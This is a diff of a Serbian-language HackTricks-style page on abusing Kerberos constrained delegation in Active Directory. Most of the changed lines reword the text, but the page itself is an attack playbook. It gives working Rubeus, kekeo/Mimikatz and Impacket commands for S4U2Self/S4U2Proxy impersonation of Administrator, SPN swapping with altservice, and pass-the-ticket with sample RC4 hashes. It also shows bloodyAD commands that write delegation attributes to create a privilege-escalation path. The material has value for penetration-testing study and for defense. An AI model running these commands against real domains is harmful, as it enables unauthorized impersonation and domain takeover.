@@ -4,18 +4,18 @@
 
 ## Constrained Delegation
 
-Korišćenjem ovoga, Domain admin može da **dozvoli** računaru da se **predstavlja kao korisnik ili računar** prema bilo kom **servisu** na računaru.
+Koristeći ovo, Domain admin može **dozvoliti** računaru da se **predstavlja kao korisnik ili računar** prema bilo kom **servisu** na mašini.
 
-- **Service for User to self (_S4U2self_):** Bilo koji **service account koji poseduje SPN** obično može da dobije TGS za sebe u ime proizvoljnog korisnika. Ako nalog takođe ima [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) u _userAccountControl_, taj TGS je **forwardable**, što protocol transition čini direktno korisnim za **classic constrained delegation**.
-- **Service for User to Proxy(_S4U2proxy_):** **service account** može da dobije TGS u ime korisnika za SPN-ove navedene u **msDS-AllowedToDelegateTo**. Evidence ticket korišćen u S4U2Proxy mora biti **forwardable** ticket ka delegirajućem servisu: ili stvarni client-to-service ticket uhvaćen od žrtve, ili onaj generisan pomoću **S4U2Self + T2A4D**.
+- **Service for User to self (_S4U2self_):** Bilo koji **service account koji poseduje SPN** obično može da dobije TGS za sebe u ime proizvoljnog korisnika. Ako nalog takođe ima [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) u _userAccountControl_, taj TGS je **forwardable**, što protocol transition direktno čini korisnim za **classic constrained delegation**.
+- **Service for User to Proxy(_S4U2proxy_):** **Service account** može da dobije TGS u ime korisnika za SPN-ove navedene u **msDS-AllowedToDelegateTo**. Evidence ticket korišćen u S4U2Proxy mora biti **forwardable** ticket ka delegating service-u: ili pravi client-to-service ticket uhvaćen od žrtve, ili ticket generisan pomoću **S4U2Self + T2A4D**.
 
-**Napomena**: Ako je korisnik u AD označen kao ‘_Account is sensitive and cannot be delegated_’ ili je član grupe **Protected Users**, obično **nećete moći da se predstavljate kao** taj korisnik putem constrained delegation. U modernim domenima, pri ciljanju naloga sa omogućenim delegation-om, prednost dajte **AES** materijalu u odnosu na pretpostavke zasnovane isključivo na RC4.
+**Napomena**: Ako je korisnik u AD-u označen opcijom ‘_Account is sensitive and cannot be delegated_’, ili je član grupe **Protected Users**, obično **nećete moći da se predstavljate kao** taj korisnik kroz constrained delegation. U modernim domenima, pri ciljanju naloga sa omogućenim delegation-om, prednost dajte **AES** materijalu umesto pretpostavki koje se oslanjaju samo na RC4.
 
-To znači da, ako **kompromitujete hash service account-a**, možete da se **predstavljate kao korisnici** i da u njihovo ime dobijete **pristup** bilo kom **servisu** na navedenim računarima (mogući **privesc**).
+To znači da, ako **kompromitujete hash service-a**, možete da se **predstavljate kao korisnici** i dobijete **access** u njihovo ime prema bilo kom **service-u** na navedenim mašinama (mogući **privesc**).
 
-Pored toga, **nećete imati pristup samo servisu za koji korisnik može da se predstavi, već i bilo kom drugom servisu**, zato što se SPN (ime servisa koje se zahteva) ne proverava (ovaj deo u ticket-u nije enkriptovan/potpisan). Prema tome, ako imate pristup **CIFS servisu**, možete imati pristup i **HOST servisu** koristeći flag `/altservice` u Rubeus-u, na primer. Ista slabost SPN swapping-a zloupotrebljava se pomoću **Impacket getST -altservice** i drugih alata.
+Štaviše, **nećete imati access samo service-u kao koji korisnik može da se predstavlja, već i bilo kom service-u**, zato što se SPN (traženo ime service-a) ne proverava (u ticket-u ovaj deo nije enkriptovan/potpisan). Prema tome, ako imate access **CIFS service-u**, možete imati access i **HOST service-u** koristeći, na primer, `/altservice` flag u Rubeus-u. Ista slabost zamene SPN-a zloupotrebljava se pomoću **Impacket getST -altservice** i drugih alata.
 
-Takođe, **pristup LDAP servisu na DC-u** je ono što je potrebno za eksploataciju **DCSync**.
+Takođe, **LDAP service access na DC-u** je ono što je potrebno za exploit **DCSync**.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -33,27 +33,27 @@ nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation
 bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
 bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
 ```
-**Napomena za operatora:** nemojte se oslanjati samo na **ADUC** ili BloodHound snimke ekrana za pregled **gMSA/sMSA**. Ti nalozi često ne prikazuju uobičajenu karticu Delegation, zato direktno enumerišite sirove atribute **`userAccountControl`** i **`msDS-AllowedToDelegateTo`**.
+**Napomena za operatora:** ne verujte samo **ADUC** ili BloodHound snimcima ekrana za pregled **gMSA/sMSA**. Ti nalozi često skrivaju uobičajenu karticu Delegation, zato direktno nabrojte sirove atribute **`userAccountControl`** i **`msDS-AllowedToDelegateTo`**.
 ```bash:Quick Way
 # Generate TGT + TGS impersonating a user knowing the hash
 Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
 ```
-### Protocol-transition vs Kerberos-only constrained delegation
+### Protocol-transition naspram Kerberos-only constrained delegation
 
-Ako kompromitovani nalog ima **T2A4D**, obično možete završiti ceo **`S4U2Self -> S4U2Proxy`** lanac samo pomoću service key/TGT.<sup>[[2]](#references)</sup>
+Ako kompromitovani nalog ima **T2A4D**, obično možete dovršiti ceo lanac **`S4U2Self -> S4U2Proxy`** samo pomoću service key/TGT.<sup>[[2]](#references)</sup>
 
-Ako ima samo **`msDS-AllowedToDelegateTo`** (klasični režim **"Use Kerberos only"**), delegation i dalje može da se zloupotrebi, ali evidence ticket za S4U2Proxy mora biti **stvaran forwardable user-to-service ticket** za delegating service. U praksi to znači krađu ili presretanje victim TGS-a iz **LSASS/ccache** i njegovo prosleđivanje u drugu fazu (`/tgs:` u Rubeus-u). **Non-forwardable** S4U2Self ticket nije dovoljan za classic constrained delegation; ako je to vaš jedini evidence ticket, proverite [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>
+Ako ima samo **`msDS-AllowedToDelegateTo`** (klasični režim **"Use Kerberos only"**), delegation se i dalje može zloupotrebiti, ali evidence ticket za S4U2Proxy mora biti **stvarni forwardable user-to-service ticket** za delegating service. U praksi to znači krađu ili hvatanje victim TGS-a iz **LSASS/ccache** i njegovo prosleđivanje u drugu fazu (`/tgs:` u Rubeus-u). **Non-forwardable** S4U2Self ticket nije dovoljan za classic constrained delegation; ako je to vaš jedini evidence ticket, proverite [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).<sup>[[2]](#references)</sup>
 
-### Cross-domain constrained delegation notes (2025+)
+### Beleške o cross-domain constrained delegation (2025+)
 
-Od **Windows Server 2012/2012 R2**, KDC podržava constrained delegation između domena/forest-a putem S4U2Proxy ekstenzija. Moderne verzije (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SID-a koji signaliziraju protocol transition:<sup>[[1]](#references)</sup>
+Od **Windows Server 2012/2012 R2** KDC podržava **constrained delegation across domains/forests** putem S4U2Proxy ekstenzija. Moderne verzije (Windows Server 2016–2025) zadržavaju ovo ponašanje i dodaju dva PAC SID-a za signalizaciju protocol transition:<sup>[[1]](#references)</sup>
 
 - `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**) kada se korisnik normalno autentifikovao.
 - `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**) kada je service potvrdio identitet putem protocol transition-a.
 
-Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi između domena, što potvrđuje da je S4U2Proxy korak uspešno završen.<sup>[[1]](#references)</sup>
+Očekujte `SERVICE_ASSERTED_IDENTITY` unutar PAC-a kada se protocol transition koristi across domains, što potvrđuje da je S4U2Proxy korak uspešno izvršen.<sup>[[1]](#references)</sup>
 
-### Impacket / Linux tooling (altservice & full S4U)
+### Impacket / Linux alati (altservice & full S4U)
 
 Noviji Impacket (0.11.x+) izlaže isti S4U lanac i SPN swapping kao Rubeus:<sup>[[2]](#references)</sup>
 ```bash
@@ -74,19 +74,19 @@ smbclient -k //dc.contoso.local/C$ -c 'dir'
 tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
 export KRB5CCNAME=Administrator_HOST.ccache
 ```
-Ako više volite da prvo forged-ujete korisnički ST (npr. kada imate samo offline hash), uparite **ticketer.py** sa **getST.py** za S4U2Proxy. **tgssub.py** je takođe koristan kada već imate funkcionalan ccache i potrebno je samo da zamenite klasu servisa za isti host. Pogledajte otvoreni Impacket issue #1713 za aktuelne specifičnosti (KRB_AP_ERR_MODIFIED kada se forged ST ne podudara sa SPN ključem).<sup>[[2]](#references)</sup>
+Ako više volite da prvo forge-ujete korisnički ST (npr. kada imate samo offline hash), kombinujte **ticketer.py** sa **getST.py** za S4U2Proxy. **tgssub.py** je takođe koristan kada već imate funkcionalan ccache i potrebno je samo da zamenite service class za isti host. Pogledajte otvoreni Impacket issue #1713 za aktuelne specifičnosti (KRB_AP_ERR_MODIFIED kada se forged ST ne podudara sa SPN ključem).<sup>[[2]](#references)</sup>
 
-### Automatizacija podešavanja delegacije pomoću kredencijala sa niskim privilegijama
+### Automatizacija podešavanja delegacije pomoću low-priv creds
 
-Ako već imate **GenericAll/WriteDACL** nad računarom ili service account-om, potrebne atribute možete udaljeno postaviti bez RSAT-a koristeći **bloodyAD** (2024+):
+Ako već imate **GenericAll/WriteDACL** nad computer ili service account-om, potrebne atribute možete udaljeno postaviti bez RSAT-a pomoću **bloodyAD** (2024+):
 ```bash
 # Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
 ```
-Ovo vam omogućava da napravite putanju constrained delegation za privesc bez DA privilegija čim budete mogli da upisujete te atribute.
+Ovo vam omogućava da napravite putanju ograničene delegacije za privesc bez DA privilegija čim budete mogli da upisujete te atribute.
 
-- Step 1: **Preuzmite TGT dozvoljenog servisa**
+- Korak 1: **Preuzmite TGT dozvoljenog servisa**
 ```bash:Get TGT
 # The first step is to get a TGT of the service that can impersonate others
 ## If you are SYSTEM in the server, you might take it from memory
@@ -106,11 +106,11 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
 > [!WARNING]
-> Postoje **drugi načini za dobijanje TGT tiketa** ili **RC4** ili **AES256** bez SYSTEM privilegija na računaru, kao što su Printer Bug i unconstrained delegation, NTLM relaying i zloupotreba Active Directory Certificate Service-a
+> Postoje **drugi načini za dobijanje TGT ticket-a** ili **RC4** ili **AES256** bez SYSTEM privilegija na računaru, kao što su Printer Bug i unconstrain delegation, NTLM relaying i zloupotreba Active Directory Certificate Service-a
 >
-> **Samo posedovanjem tog TGT tiketa (ili njegovog hash-a) možete izvesti ovaj napad bez kompromitovanja celog računara.**
+> **Samo posedovanje tog TGT ticket-a (ili njegovog hash-a) omogućava izvođenje ovog napada bez kompromitovanja celog računara.**
 
-- Korak 2: **Dobavite TGS za servis koji se predstavlja kao korisnik**
+- Step2: **Dobijanje TGS-a za service uz impersonating korisnika**
 ```bash:Using Rubeus
 # Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -129,7 +129,7 @@ tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7
 ```
 
 ```bash:kekeo + Mimikatz
-#Obtain a TGT for the Constained allowed user
+#Obtain a TGT for the constrained-delegation user
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 
 #Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
@@ -140,11 +140,10 @@ Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.
 ```
 [**Više informacija na ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) i [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>
 
-## Reference
+## References
 
-- [1] [Pregled Kerberos Constrained Delegation (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
-- [2] [Zloupotreba Delegation pomoću Impacket-a (2. deo): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
-- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
-- [4] [Kerberosity Killed the Domain: Offensive pregled Kerberos-a (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
-
+- [1] [Pregled ograničene Kerberos delegacije (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
+- [2] [Zloupotreba delegacije pomoću Impacket-a (2. deo): Ograničena delegacija (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
+- [3] [Ograničena Kerberos delegacija (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+- [4] [Kerberosity je uništio domen: Pregled ofanzivnog Kerberos-a (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 {{#include ../../banners/hacktricks-training.md}}
